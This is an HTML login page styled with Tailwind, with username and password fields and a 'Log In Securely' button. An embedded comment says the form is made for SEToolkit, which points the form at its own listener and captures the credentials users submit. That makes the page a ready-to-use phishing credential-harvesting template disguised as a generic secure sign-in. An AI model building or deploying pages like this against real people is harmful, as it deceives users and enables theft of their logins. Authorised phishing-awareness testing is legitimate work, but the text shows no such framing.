<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Service Login</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
        /* Custom gradient for a modern feel */
        .submit-btn {
            background-image: linear-gradient(to right, #4F46E5, #6366F1, #818CF8);
            transition: transform 0.1s ease-in-out, box-shadow 0.1s ease-in-out;
        }
        .submit-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 15px -3px rgba(99, 102, 241, 0.5), 0 2px 6px -4px rgba(99, 102, 241, 0.5);
        }
    </style>
</head>
<body class="bg-gray-900 min-h-screen flex items-center justify-center p-4">

    <!-- Login Card Container -->
    <div class="w-full max-w-md bg-gray-800 p-8 md:p-10 rounded-xl shadow-2xl border border-gray-700/50">

        <!-- Header -->
        <div class="text-center mb-8">
            <svg class="w-12 h-12 text-indigo-400 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
            </svg>
            <h1 class="text-3xl font-bold text-white mb-2">Sign In</h1>
            <p class="text-gray-400 text-sm">Access your secure account dashboard.</p>
        </div>

        <!-- Login Form -->
        <!--
          NOTE: This form is now passive and designed to work directly with SEToolkit.
          SEToolkit will automatically set the 'action' attribute to its own listener URL
          and capture the credentials when the user clicks 'Log In Securely'.
        -->
        <form id="login-form" method="POST">
            <div class="space-y-6">
                <!-- Username/Email Field -->
                <div>
                    <label for="username" class="block text-sm font-medium text-gray-300 mb-1">Username or Email</label>
                    <input
                        type="text"
                        name="username"
                        id="username"
                        required
                        placeholder="john.doe@example.com"
                        class="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition duration-150"
                    >
                </div>

                <!-- Password Field -->
                <div>
                    <label for="password" class="block text-sm font-medium text-gray-300 mb-1">Password</label>
                    <input
                        type="password"
                        name="password"
                        id="password"
                        required
                        placeholder="Enter your password"
                        class="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition duration-150"
                    >
                </div>

                <!-- Submit Button -->
                <button
                    type="submit"
                    class="submit-btn w-full text-white font-semibold py-3 rounded-lg shadow-lg focus:outline-none focus:ring-4 focus:ring-indigo-500 focus:ring-opacity-50 transition duration-300"
                >
                    Log In Securely
                </button>
            </div>
        </form>

        <!-- Footer Links -->
        <div class="mt-8 text-center">
            <a href="#" class="text-sm text-indigo-400 hover:text-indigo-300 transition duration-150 mt-2 block">Forgot Password?</a>
        </div>
    </div>
</body>
</html>
